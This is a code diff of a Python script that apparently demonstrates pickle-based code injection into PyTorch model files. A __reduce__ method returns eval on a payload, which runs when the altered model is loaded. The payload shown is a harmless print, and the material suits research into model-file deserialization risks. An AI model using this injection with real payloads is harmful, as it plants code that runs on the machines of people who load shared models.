@@ -1,7 +1,7 @@
 import torch
 import zipfile
 import io
-from fickle import Pickled
+from fickling.fickle import Pickled
 import pickle 
 from pathlib import Path
 import shutil
@@ -22,7 +22,6 @@ class BaseInjection(torch.nn.Module):
         return self.original_model(*args, **kwargs)
     
     def __reduce__(self):
-        print('hello')
         return eval, (self.payload,)
 
 
@@ -53,20 +52,13 @@ class PyTorchModelWrapper:
 
 
 # Uncomment these lines if you no longer have a 'mobilenet_v2.pt' file
-#import torchvision.models as models
-#model = models.mobilenet_v2()
-#torch.save(model, 'mobilenet_v2.pt')
+import torchvision.models as models
+model = models.mobilenet_v2()
+torch.save(model, 'mobilenet_v2.pt')
+
 deserialized_model = torch.load('mobilenet_v2.pt')
 file_path = 'path/to/pytorch/model.pth'
 wrapper = PyTorchModelWrapper('mobilenet_v2.pt')
 payload = '''print("Hello, World!")'''
 wrapper.inject_payload(payload, 'altered_model.pt')
 torch.load('altered_model.pt')
-#pickle.loads(target.dumps())
-
-# Load the modified model using torch.load with a BytesIO object
-#modified_model_data = io.BytesIO(target.dumps())
-#deserialized_modified_model = pickle.loads(modified_model_data)
-
-#wrapper.inject_code('print("Hello, World!")')
-#wrapper.save('injected_model.pt')
